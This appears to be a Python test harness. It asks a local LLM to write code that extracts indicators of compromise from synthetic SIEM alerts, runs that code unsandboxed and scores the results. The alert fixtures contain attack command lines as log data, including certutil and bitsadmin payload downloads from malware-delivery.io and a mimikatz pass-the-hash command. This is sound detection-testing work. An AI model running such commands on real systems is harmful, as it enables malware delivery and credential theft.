"""Direct Path B test — calls Ollama, runs generated code, checks IOCs.
Bypasses the pipeline infrastructure to answer the core question:
Can qwen2.5:14b generate investigation code that extracts IOCs from SIEM data?
"""
import json
import subprocess
import sys
import time
import urllib.request

import os
OLLAMA_URL = os.environ.get("OLLAMA_URL", "http://host.docker.internal:11434/v1/chat/completions")
MODEL = os.environ.get("MODEL", "deepseek-coder:6.7b")

SYSTEM_PROMPT = (
    "You are a senior security analyst. Generate a self-contained Python script. "
    "The script MUST embed the provided SIEM alert data in a multi-line string variable and analyze it directly. "
    "Do NOT use mock data — the real data is provided. Use ONLY the Python standard library. "
    "Do NOT use input(), subprocess, socket, requests, or any network calls. Print results as valid JSON to stdout. "
    "CRITICAL: The script runs in a read-only sandbox. Write files ONLY to /tmp/. "
    "REQUIRED JSON OUTPUT STRUCTURE: Your script MUST print perfectly valid JSON to stdout containing exactly these EXACT top-level keys: "
    "`findings` (array of objects with title and details), "
    "`iocs` (array of objects with type, value, and confidence — extract ALL IP addresses, domains, hostnames, usernames, file hashes, file paths, email addresses from the data), "
    "`statistics` (object with counts and metrics), "
    "`recommendations` (array of strings), "
    "`risk_score` (integer 0-100). "
    "CRITICAL IOC EXTRACTION RULES: "
    "1. Extract EVERY IP address (both source and destination) "
    "2. Extract EVERY username and hostname "
    "3. Extract EVERY file hash (MD5, SHA1, SHA256) "
    "4. Extract EVERY domain name and URL "
    "5. Extract EVERY suspicious file path "
    "6. Use regex patterns: r'\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b' for IPs, r'[a-f0-9]{32}' for MD5, etc. "
    "7. Each IOC must have: type (ipv4/domain/hostname/username/hash_md5/file_path), value, confidence (high/medium/low)"
)

TESTS = [
    {
        "name": "B1_apt_intrusion",
        "prompt": "Investigate advanced persistent threat with multi-stage intrusion indicators",
        "siem_event": {
            "title": "APT Multi-Stage Intrusion Detected",
            "source_ip": "203.0.113.42",
            "destination_ip": "10.0.0.5",
            "hostname": "CORP-DC-01",
            "username": "svc_exchange",
            "rule_name": "APT_MultiStage",
            "raw_log": "EventID=4624 LogonType=3 SourceIP=203.0.113.42 User=svc_exchange TargetHost=CORP-DC-01\nEventID=4688 NewProcessName=C:\\Windows\\System32\\cmd.exe ParentProcess=C:\\Windows\\System32\\services.exe CommandLine=cmd /c whoami & net user & ipconfig /all\nEventID=5140 ShareName=ADMIN$ SourceIP=203.0.113.42 User=svc_exchange\nEventID=4698 TaskName=WindowsUpdate TaskContent=C:\\Windows\\Temp\\svcupdate.exe User=svc_exchange\nMD5=a1b2c3d4e5f6789012345678abcdef01 File=svcupdate.exe"
        },
        "expected_iocs": ["203.0.113.42", "svc_exchange", "CORP-DC-01", "a1b2c3d4e5f6789012345678abcdef01", "svcupdate.exe"]
    },
    {
        "name": "B2_living_off_the_land",
        "prompt": "Investigate LOLBin abuse using certutil and bitsadmin for payload delivery",
        "siem_event": {
            "title": "LOLBin Abuse - Certutil Payload Download",
            "source_ip": "10.0.0.33",
            "destination_ip": "91.195.240.117",
            "hostname": "WS-SALES-11",
            "username": "jdoe",
            "rule_name": "LOLBin_CertUtil_Download",
            "raw_log": "EventID=4688 NewProcessName=C:\\Windows\\System32\\certutil.exe CommandLine=certutil -urlcache -split -f http://malware-delivery.io/payload.exe C:\\Temp\\update.exe ParentProcess=C:\\Windows\\System32\\cmd.exe User=jdoe\nEventID=4688 NewProcessName=C:\\Windows\\System32\\bitsadmin.exe CommandLine=bitsadmin /transfer job http://malware-delivery.io/stage2.dll C:\\Temp\\stage2.dll User=jdoe\nDNS query: malware-delivery.io from 10.0.0.33\nEventID=4688 NewProcessName=C:\\Temp\\update.exe ParentProcess=C:\\Windows\\System32\\certutil.exe User=jdoe"
        },
        "expected_iocs": ["10.0.0.33", "91.195.240.117", "malware-delivery.io", "jdoe", "certutil.exe", "bitsadmin.exe"]
    },
    {
        "name": "B3_firmware_attack",
        "prompt": "Investigate potential firmware manipulation on industrial control system",
        "siem_event": {
            "title": "Firmware Integrity Violation - PLC",
            "source_ip": "10.0.0.200",
            "destination_ip": "10.0.0.1",
            "hostname": "PLC-CTRL-01",
            "username": "scada_svc",
            "rule_name": "FW_Integrity_Violation",
            "raw_log": "FW_CHECK FAIL host=PLC-CTRL-01 expected_hash=3f7a9b2c1d4e5f6a actual_hash=deadbeef12345678 component=bootloader\nEventID=4688 NewProcessName=C:\\SCADA\\fwupdate.exe CommandLine=fwupdate.exe --force --no-verify --target=bootloader User=scada_svc SourceIP=10.0.0.200\nNetflow: 10.0.0.200 -> 185.220.101.99:443 bytes=2048000 proto=TCP process=fwupdate.exe\nSYSLOG: PLC-CTRL-01 kernel: firmware signature verification DISABLED"
        },
        "expected_iocs": ["10.0.0.200", "185.220.101.99", "PLC-CTRL-01", "deadbeef12345678", "fwupdate.exe", "scada_svc"]
    },
    {
        "name": "B4_ssh_brute_force",
        "prompt": "Analyze SSH brute force attack pattern from external IP",
        "siem_event": {
            "title": "SSH Brute Force Attack",
            "source_ip": "10.0.0.99",
            "destination_ip": "10.0.0.5",
            "hostname": "WEB-PROD-01",
            "username": "admin",
            "rule_name": "SSH_BruteForce",
            "raw_log": "Mar 15 10:23:45 sshd[12345]: Failed password for admin from 10.0.0.99 port 22 ssh2\nMar 15 10:23:46 sshd[12345]: Failed password for admin from 10.0.0.99 port 22 ssh2\nMar 15 10:23:47 sshd[12345]: Failed password for admin from 10.0.0.99 port 22 ssh2\nMar 15 10:23:48 sshd[12345]: Failed password for admin from 10.0.0.99 port 22 ssh2\nMar 15 10:23:49 sshd[12345]: Accepted password for admin from 10.0.0.99 port 22 ssh2"
        },
        "expected_iocs": ["10.0.0.99", "admin", "WEB-PROD-01"]
    },
    {
        "name": "B5_ntlm_lateral_movement",
        "prompt": "Investigate NTLM pass-the-hash lateral movement between workstations",
        "siem_event": {
            "title": "NTLM Pass-the-Hash Lateral Movement",
            "source_ip": "10.0.0.50",
            "destination_ip": "10.0.0.200",
            "hostname": "WS-FINANCE-03",
            "username": "svc_backup",
            "rule_name": "PtH_Detected",
            "raw_log": "EventID=4624 LogonType=9 SourceIP=10.0.0.50 TargetHost=DC-PRIMARY.corp.local TargetIP=10.0.0.200 User=svc_backup NTLM_hash=aad3b435b51404eeaad3b435b51404ee Process=C:\\Windows\\System32\\svchost.exe ParentProcess=C:\\Tools\\mimikatz.exe CommandLine=sekurlsa::pth /user:svc_backup /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee"
        },
        "expected_iocs": ["10.0.0.50", "10.0.0.200", "svc_backup", "aad3b435b51404eeaad3b435b51404ee", "mimikatz.exe", "DC-PRIMARY.corp.local"]
    }
]


def call_ollama(system_prompt, user_prompt):
    """Call Ollama and return generated code."""
    payload = json.dumps({
        "model": MODEL,
        "messages": [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_prompt}
        ],
        "temperature": 0.7,
        "max_tokens": 4096,
    }).encode()

    req = urllib.request.Request(
        OLLAMA_URL,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    start = time.time()
    with urllib.request.urlopen(req, timeout=600) as resp:
        result = json.loads(resp.read())
    elapsed = time.time() - start

    content = result["choices"][0]["message"]["content"]
    usage = result.get("usage", {})
    return content, elapsed, usage


def extract_python_code(response):
    """Extract Python code from LLM response."""
    # Try ```python ... ``` blocks
    if "```python" in response:
        parts = response.split("```python")
        if len(parts) > 1:
            code = parts[1].split("```")[0]
            return code.strip()
    # Try ``` ... ``` blocks
    if "```" in response:
        parts = response.split("```")
        if len(parts) >= 3:
            return parts[1].strip()
    # Assume entire response is code
    return response.strip()


def run_code(code, timeout=30):
    """Execute generated Python code and return output."""
    try:
        result = subprocess.run(
            [sys.executable, "-c", code],
            capture_output=True, text=True, timeout=timeout
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except Exception as e:
        return "", str(e), -1


def score_iocs(found_iocs, expected_iocs):
    """Score IOC extraction against expected values."""
    found_values = set()
    for ioc in found_iocs:
        if isinstance(ioc, dict):
            found_values.add(str(ioc.get("value", "")).lower())
        else:
            found_values.add(str(ioc).lower())

    hits = 0
    for expected in expected_iocs:
        if expected.lower() in found_values:
            hits += 1
        else:
            # Check partial matches (e.g., "10.0.0.99" in any found value)
            for fv in found_values:
                if expected.lower() in fv:
                    hits += 1
                    break

    return hits, len(expected_iocs)


def run_test(test):
    """Run a single Path B test."""
    print(f"\n{'='*60}")
    print(f"TEST: {test['name']}")
    print(f"{'='*60}")

    siem_json = json.dumps(test["siem_event"], indent=2)
    user_prompt = f"SIEM ALERT DATA:\n{siem_json}\n\nTask: {test['prompt']}\n\nIMPORTANT: Extract ALL IOCs (IPs, domains, usernames, hostnames, file hashes, file paths) from the alert data. Include an 'iocs' key in your JSON output."

    print(f"Calling Ollama ({MODEL})...")
    try:
        response, elapsed, usage = call_ollama(SYSTEM_PROMPT, user_prompt)
    except Exception as e:
        print(f"  LLM CALL FAILED: {e}")
        return {"name": test["name"], "status": "llm_failed", "error": str(e)}

    print(f"  LLM response: {len(response)} chars in {elapsed:.1f}s")
    print(f"  Tokens: {usage.get('prompt_tokens', '?')} in, {usage.get('completion_tokens', '?')} out")

    code = extract_python_code(response)
    print(f"  Extracted code: {len(code)} chars")

    # Save code for inspection
    code_file = f"/tmp/path_b_{test['name']}.py"
    with open(code_file, "w") as f:
        f.write(code)

    print(f"  Running code...")
    stdout, stderr, returncode = run_code(code)

    if returncode != 0:
        print(f"  CODE EXECUTION FAILED (rc={returncode})")
        if stderr:
            print(f"  stderr: {stderr[:500]}")
        # Try to see if there's partial output
        if not stdout:
            return {
                "name": test["name"], "status": "exec_failed",
                "error": stderr[:200], "code_length": len(code),
                "llm_time": elapsed
            }

    # Parse JSON output
    try:
        output = json.loads(stdout)
    except (json.JSONDecodeError, ValueError) as e:
        print(f"  JSON PARSE FAILED: {e}")
        print(f"  stdout: {stdout[:500]}")
        return {
            "name": test["name"], "status": "json_failed",
            "stdout": stdout[:200], "code_length": len(code),
            "llm_time": elapsed
        }

    # Score results
    findings = output.get("findings", [])
    iocs = output.get("iocs", [])
    risk_score = output.get("risk_score", 0)
    recommendations = output.get("recommendations", [])

    ioc_hits, ioc_total = score_iocs(iocs, test["expected_iocs"])

    result = {
        "name": test["name"],
        "status": "completed",
        "findings_count": len(findings),
        "iocs_count": len(iocs),
        "iocs_expected": ioc_total,
        "iocs_matched": ioc_hits,
        "ioc_rate": f"{ioc_hits}/{ioc_total} ({100*ioc_hits//ioc_total}%)" if ioc_total > 0 else "N/A",
        "risk_score": risk_score,
        "recommendations_count": len(recommendations),
        "llm_time_s": round(elapsed, 1),
        "code_length": len(code),
    }

    print(f"  RESULTS:")
    print(f"    Findings: {len(findings)}")
    print(f"    IOCs: {len(iocs)} found, {ioc_hits}/{ioc_total} expected matched")
    print(f"    Risk score: {risk_score}")
    print(f"    Recommendations: {len(recommendations)}")

    # Show IOC details
    if iocs:
        print(f"    IOC details:")
        for ioc in iocs[:10]:
            if isinstance(ioc, dict):
                print(f"      - {ioc.get('type', '?')}: {ioc.get('value', '?')} ({ioc.get('confidence', '?')})")
            else:
                print(f"      - {ioc}")

    # Show expected misses
    found_values = set()
    for ioc in iocs:
        if isinstance(ioc, dict):
            found_values.add(str(ioc.get("value", "")).lower())
    missed = [e for e in test["expected_iocs"] if e.lower() not in found_values and not any(e.lower() in fv for fv in found_values)]
    if missed:
        print(f"    MISSED expected IOCs: {missed}")

    return result


if __name__ == "__main__":
    print("=" * 60)
    print("PATH B DIRECT TEST — LLM Code Generation Quality")
    print(f"Model: {MODEL}")
    print(f"Endpoint: {OLLAMA_URL}")
    print("=" * 60)

    # Quick connectivity check
    try:
        ollama_base = OLLAMA_URL.rsplit("/v1/", 1)[0]
        req = urllib.request.Request(
            f"{ollama_base}/api/tags",
            method="GET"
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            models = json.loads(resp.read())
        model_names = [m["name"] for m in models.get("models", [])]
        print(f"Ollama models: {model_names}")
        if MODEL not in model_names:
            print(f"WARNING: {MODEL} not found in Ollama!")
            sys.exit(1)
    except Exception as e:
        print(f"FATAL: Cannot reach Ollama: {e}")
        sys.exit(1)

    results = []
    for test in TESTS:
        result = run_test(test)
        results.append(result)
        print()

    # Summary table
    print("\n" + "=" * 80)
    print("PATH B RESULTS SUMMARY")
    print("=" * 80)
    print(f"{'Test':<30} {'Status':<12} {'IOCs':<15} {'Findings':<10} {'Risk':<6} {'Time':<8}")
    print("-" * 80)

    total_ioc_hits = 0
    total_ioc_expected = 0
    completed = 0
    total_findings = 0

    for r in results:
        status = r.get("status", "?")
        ioc_rate = r.get("ioc_rate", "N/A")
        findings = r.get("findings_count", 0)
        risk = r.get("risk_score", "?")
        time_s = r.get("llm_time_s", "?")
        print(f"{r['name']:<30} {status:<12} {ioc_rate:<15} {findings:<10} {risk:<6} {time_s}s")

        if status == "completed":
            completed += 1
            total_ioc_hits += r.get("iocs_matched", 0)
            total_ioc_expected += r.get("iocs_expected", 0)
            total_findings += findings

    print("-" * 80)
    if total_ioc_expected > 0:
        pct = 100 * total_ioc_hits // total_ioc_expected
        print(f"Overall IOC extraction: {total_ioc_hits}/{total_ioc_expected} ({pct}%)")
    print(f"Completed: {completed}/{len(TESTS)}")
    print(f"Total findings: {total_findings}")

    # Comparison with Path A baseline
    print("\n" + "=" * 80)
    print("COMPARISON: Path A (Template) vs Path B (LLM Generate)")
    print("=" * 80)
    print("Path A (Template) baseline:")
    print("  brute_force:       1 IOC,  2 findings, risk 95")
    print("  lateral_movement:  5 IOCs, 8 findings, risk 95")
    print("  privilege_esc:    11 IOCs, 4 findings, risk 95")
    print("  data_exfil:        5 IOCs, 1 finding,  risk 0 (wrong template)")
    print("  IOC rate: 22/28 (79%) — but templates are hand-coded")
    print()
    print(f"Path B (LLM) results:")
    if total_ioc_expected > 0:
        print(f"  IOC extraction: {total_ioc_hits}/{total_ioc_expected} ({pct}%)")
    print(f"  Completed: {completed}/{len(TESTS)}")
    print()
    if total_ioc_expected > 0:
        if pct >= 60:
            print("CONCLUSION: LLM Path B extracts IOCs adequately. SIEM injection fix helped.")
        elif pct >= 30:
            print("CONCLUSION: Marginal improvement. LLM extracts some IOCs but needs better prompts or larger model.")
        else:
            print("CONCLUSION: LLM Path B still weak on IOC extraction. Need 7B+ model or DPO training.")

    # Save results
    with open("tests/path_b_results.json", "w") as f:
        json.dump({"model": MODEL, "results": results, "summary": {
            "completed": completed, "total": len(TESTS),
            "ioc_hits": total_ioc_hits, "ioc_expected": total_ioc_expected,
            "ioc_rate_pct": pct if total_ioc_expected > 0 else 0,
            "total_findings": total_findings,
        }}, f, indent=2)
    print(f"\nResults saved to tests/path_b_results.json")
